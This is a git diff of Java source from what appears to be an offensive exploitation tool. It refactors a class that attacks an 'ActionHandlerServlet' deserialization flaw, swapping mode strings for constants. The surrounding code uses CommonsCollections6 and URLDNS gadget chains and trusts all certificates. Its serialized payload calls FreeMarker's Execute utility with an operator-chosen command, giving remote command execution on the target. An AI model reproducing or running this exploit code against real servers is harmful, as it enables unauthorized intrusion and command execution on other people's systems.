@@ -1,8 +1,9 @@
 package com.chave.vuln;
 
-import com.chave.bean.Config;
-import com.chave.bean.ClassCode;
-import com.chave.bean.ClassName;
+import com.chave.config.Config;
+import com.chave.config.ClassCode;
+import com.chave.config.ClassName;
+import com.chave.config.Mod;
 import com.chave.gadget.chain.CommonsCollections6_Array;
 import com.chave.gadget.chain.URLDNS;
 import com.chave.proxy.HttpProxy;
@@ -38,11 +39,11 @@ public class ActionHandlerServlet_Unserialize extends VulnBase {
 
         try {
             // 调用对应方法
-            if (Config.MOD.equals("poc")) {
+            if (Config.MOD.equals(Mod.POC)) {
                 poc(vulnerable_url);
-            } else if (Config.MOD.equals("exp")) {
+            } else if (Config.MOD.equals(Mod.EXP)) {
                 exp_cc6(vulnerable_url);
-            } else if (Config.MOD.equals("exec")) {
+            } else if (Config.MOD.equals(Mod.EXEC)) {
                 if (exec_cc6(vulnerable_url)) {
                     return;
                 } else {
@@ -237,7 +238,7 @@ public class ActionHandlerServlet_Unserialize extends VulnBase {
             SSLUtil.trustAllCertificates();
 
             oos.writeObject("freemarker.template.utility.Execute");
-            oos.writeObject("exec");
+            oos.writeObject(Mod.EXEC);
             ArrayList list = new ArrayList();
             list.add(Config.CMD);
             oos.writeObject(list);
